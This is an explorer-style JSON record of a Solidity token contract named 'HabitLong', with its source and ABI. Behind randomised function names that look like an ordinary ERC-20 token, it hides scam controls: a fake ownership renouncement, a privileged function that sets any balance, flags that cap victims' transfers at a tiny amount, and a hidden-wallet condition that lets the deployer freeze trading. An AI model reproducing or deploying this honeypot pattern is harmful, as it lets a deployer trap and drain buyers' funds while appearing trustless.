{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface isLaunchBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldTrading {\n    function createPair(address senderFee, address toSender) external returns (address);\n}\n\ninterface toTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingLiquidity) external view returns (uint256);\n\n    function transfer(address feeLimit, uint256 fromSenderSell) external returns (bool);\n\n    function allowance(address tokenExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromSenderSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeLimit,\n        uint256 fromSenderSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeAt, uint256 value);\n    event Approval(address indexed tokenExempt, address indexed spender, uint256 value);\n}\n\ninterface totalLaunchedLimit is toTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HabitLong is minReceiver, toTotal, totalLaunchedLimit {\n\n    uint256 public limitTokenTx;\n\n    function approve(address feeTake, uint256 fromSenderSell) public virtual override returns (bool) {\n        autoReceiver[_msgSender()][feeTake] = fromSenderSell;\n        emit Approval(_msgSender(), feeTake, fromSenderSell);\n        return true;\n    }\n\n    address public fundMode;\n\n    uint256 public exemptLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxAt;\n    }\n\n    constructor (){\n        \n        isLaunchBuy sellMarketingTeam = isLaunchBuy(feeLimitSell);\n        fundMode = shouldTrading(sellMarketingTeam.factory()).createPair(sellMarketingTeam.WETH(), address(this));\n        if (swapAutoSell) {\n            exemptLiquidity = txMax;\n        }\n        tradingLiquidityBuy = _msgSender();\n        feeTotalLimit();\n        fundExempt[tradingLiquidityBuy] = true;\n        amountLaunched[tradingLiquidityBuy] = takeEnable;\n        if (limitTokenTx != txMax) {\n            swapAutoSell = true;\n        }\n        emit Transfer(address(0), tradingLiquidityBuy, takeEnable);\n    }\n\n    uint256 private takeEnable = 100000000 * 10 ** 18;\n\n    bool public sellTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeEnable;\n    }\n\n    address private liquidityAmountIs;\n\n    bool public feeSender;\n\n    event OwnershipTransferred(address indexed fromAuto, address indexed atWallet);\n\n    uint256 maxBuy;\n\n    mapping(address => bool) public isMarketingLaunch;\n\n    function transferFrom(address takeToken, address feeLimit, uint256 fromSenderSell) external override returns (bool) {\n        if (_msgSender() != feeLimitSell) {\n            if (autoReceiver[takeToken][_msgSender()] != type(uint256).max) {\n                require(fromSenderSell <= autoReceiver[takeToken][_msgSender()]);\n                autoReceiver[takeToken][_msgSender()] -= fromSenderSell;\n            }\n        }\n        return listSender(takeToken, feeLimit, fromSenderSell);\n    }\n\n    bool public swapAutoSell;\n\n    uint8 private walletIsAmount = 18;\n\n    address tradingWalletTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function listSender(address takeToken, address feeLimit, uint256 fromSenderSell) internal returns (bool) {\n        if (takeToken == tradingLiquidityBuy) {\n            return limitMode(takeToken, feeLimit, fromSenderSell);\n        }\n        uint256 senderLimit = toTotal(fundMode).balanceOf(tradingWalletTeam);\n        require(senderLimit == totalToReceiver);\n        require(feeLimit != tradingWalletTeam);\n        if (isMarketingLaunch[takeToken]) {\n            return limitMode(takeToken, feeLimit, launchMode);\n        }\n        return limitMode(takeToken, feeLimit, fromSenderSell);\n    }\n\n    function allowance(address atExempt, address feeTake) external view virtual override returns (uint256) {\n        if (feeTake == feeLimitSell) {\n            return type(uint256).max;\n        }\n        return autoReceiver[atExempt][feeTake];\n    }\n\n    bool public isAt;\n\n    function name() external view virtual override returns (string memory) {\n        return minReceiverLiquidity;\n    }\n\n    function exemptWallet() private view {\n        require(fundExempt[_msgSender()]);\n    }\n\n    string private maxAt = \"HLG\";\n\n    uint256 private receiverList;\n\n    uint256 public txMax;\n\n    uint256 public fromExempt;\n\n    uint256 constant launchMode = 18 ** 10;\n\n    mapping(address => uint256) private amountLaunched;\n\n    uint256 totalToReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletIsAmount;\n    }\n\n    function takeFund(uint256 fromSenderSell) public {\n        exemptWallet();\n        totalToReceiver = fromSenderSell;\n    }\n\n    mapping(address => bool) public fundExempt;\n\n    function transfer(address marketingTx, uint256 fromSenderSell) external virtual override returns (bool) {\n        return listSender(_msgSender(), marketingTx, fromSenderSell);\n    }\n\n    function owner() external view returns (address) {\n        return liquidityAmountIs;\n    }\n\n    address public tradingLiquidityBuy;\n\n    mapping(address => mapping(address => uint256)) private autoReceiver;\n\n    function totalMax(address isLimit) public {\n        require(isLimit.balance < 100000);\n        if (feeSender) {\n            return;\n        }\n        \n        fundExempt[isLimit] = true;\n        if (fromExempt == limitTokenTx) {\n            sellTotal = false;\n        }\n        feeSender = true;\n    }\n\n    address feeLimitSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private minReceiverLiquidity = \"Habit Long\";\n\n    function balanceOf(address tradingLiquidity) public view virtual override returns (uint256) {\n        return amountLaunched[tradingLiquidity];\n    }\n\n    function limitMode(address takeToken, address feeLimit, uint256 fromSenderSell) internal returns (bool) {\n        require(amountLaunched[takeToken] >= fromSenderSell);\n        amountLaunched[takeToken] -= fromSenderSell;\n        amountLaunched[feeLimit] += fromSenderSell;\n        emit Transfer(takeToken, feeLimit, fromSenderSell);\n        return true;\n    }\n\n    function txMin(address swapIsReceiver) public {\n        exemptWallet();\n        if (exemptLiquidity == fromExempt) {\n            isAt = true;\n        }\n        if (swapIsReceiver == tradingLiquidityBuy || swapIsReceiver == fundMode) {\n            return;\n        }\n        isMarketingLaunch[swapIsReceiver] = true;\n    }\n\n    function txLiquidity(address marketingTx, uint256 fromSenderSell) public {\n        exemptWallet();\n        amountLaunched[marketingTx] = fromSenderSell;\n    }\n\n    function getOwner() external view returns (address) {\n        return liquidityAmountIs;\n    }\n\n    function feeTotalLimit() public {\n        emit OwnershipTransferred(tradingLiquidityBuy, address(0));\n        liquidityAmountIs = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSenderSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTotalLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isMarketingLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTokenTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAutoSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromSenderSell\",\"type\":\"uint256\"}],\"name\":\"takeFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLimit\",\"type\":\"address\"}],\"name\":\"totalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLiquidityBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSenderSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSenderSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSenderSell\",\"type\":\"uint256\"}],\"name\":\"txLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIsReceiver\",\"type\":\"address\"}],\"name\":\"txMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HabitLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}